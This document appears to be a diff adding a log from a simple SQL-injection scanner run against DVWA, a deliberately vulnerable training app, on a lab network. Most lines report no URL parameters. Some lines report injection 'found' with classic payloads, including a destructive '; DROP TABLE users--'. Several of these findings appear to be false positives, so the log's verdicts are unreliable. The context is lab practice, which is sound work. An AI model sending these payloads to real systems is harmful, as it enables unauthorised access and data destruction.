@@ -1,0 +1,103 @@
+No URL parameters found in http://10.0.2.4/vulnerabilities/brute
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/cryptography
+No URL parameters found in http://10.0.2.4/vulnerabilities/upload
+No URL parameters found in http://10.0.2.4/vulnerabilities/csp
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/exec
+No URL parameters found in http://10.0.2.4/vulnerabilities/sqli
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=' OR 1=1 --
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=' OR 'a'='a
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=' OR 'x'='x
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/manual
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/brute
+No URL parameters found in http://10.0.2.4/setup.php
+No URL parameters found in http://10.0.2.4/DVWA/phpinfo.php
+SQL Injection vulnerability found at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=' OR 1=1 --
+SQL Injection vulnerability found at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=' OR 'a'='a
+SQL Injection vulnerability found at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=' OR 'x'='x
+SQL Injection vulnerability found at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/DVWA/docs/DVWA_v1.3.pdfS
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_d
+No URL parameters found in http://10.0.2.4/phpinfo.php
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=' OR 1=1 --
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=' OR 'a'='a
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=' OR 'x'='x
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/DVWA/instructions.php
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=' OR 1=1 --
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=' OR 'a'='a
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=' OR 'x'='x
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/vulnerabilities/xss_r
+No URL parameters found in http://10.0.2.4/vulnerabilities/xss_d
+No URL parameters found in http://10.0.2.4/vulnerabilities/cryptography
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=' OR 1=1 --
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=' OR 'a'='a
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=' OR 'x'='x
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/DVWA/README.fr.md
+No URL parameters found in http://10.0.2.4/DVWA/setup.php
+No URL parameters found in http://10.0.2.4/DVWA/security.php
+No URL parameters found in http://10.0.2.4/DVWA
+No URL parameters found in http://10.0.2.4/security.php
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=' OR 1=1 --
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=' OR 'a'='a
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=' OR 'x'='x
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/DVWA/README.pl.md
+No URL parameters found in http://10.0.2.4/DVWA/README.vi.md
+No URL parameters found in http://10.0.2.4/DVWA/compose.yml
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_s
+No URL parameters found in http://10.0.2.4/vulnerabilities/open_redirect
+No URL parameters found in http://10.0.2.4/about.php
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli_blind
+No URL parameters found in http://10.0.2.4/vulnerabilities/authbypass
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=' OR 1=1 --
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=' OR 'a'='a
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=' OR 'x'='x
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc='; DROP TABLE users--
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=' OR 1=1 --
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=' OR 'a'='a
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=' OR 'x'='x
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/DVWA/README.ar.md
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_r
+No URL parameters found in http://10.0.2.4/vulnerabilities/csrf
+No URL parameters found in http://10.0.2.4/vulnerabilities/weak_id
+No URL parameters found in http://10.0.2.4/DVWA/README.fa.md
+No URL parameters found in http://10.0.2.4/DVWA/README.tr.md
+No URL parameters found in http://10.0.2.4/DVWA/README.zh.md
+No URL parameters found in http://10.0.2.4/DVWA/README.id.md
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/javascript
+No URL parameters found in http://10.0.2.4/DVWA/README.pt.md
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli
+No URL parameters found in http://10.0.2.4/vulnerabilities/exec
+No URL parameters found in http://10.0.2.4/DVWA/config/config.inc.php.dist
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/open_redirect
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=' OR 1=1 --
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=' OR 'a'='a
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=' OR 'x'='x
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page='; DROP TABLE users--
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=' OR 1=1 --
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=' OR 'a'='a
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=' OR 'x'='x
+SQL Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/captcha
+No URL parameters found in http://10.0.2.4/DVWA/about.php
+No URL parameters found in http://10.0.2.4/DVWA/README.ko.md
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/upload
+No URL parameters found in http://10.0.2.4/vulnerabilities/captcha
+No URL parameters found in http://10.0.2.4
+No URL parameters found in http://10.0.2.4/vulnerabilities/javascript
+No URL parameters found in http://10.0.2.4/vulnerabilities/xss_s
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/authbypass
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/csrf
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/weak_id
+No URL parameters found in http://10.0.2.4/instructions.php
+No URL parameters found in http://10.0.2.4/DVWA/README.es.md
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=' OR 1=1 --
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=' OR 'a'='a
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=' OR 'x'='x
+No SQL Injection vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page='; DROP TABLE users--
+No URL parameters found in http://10.0.2.4/DVWA/vulnerabilities/csp
+No URL parameters found in http://10.0.2.4/vulnerabilities/sqli_blind
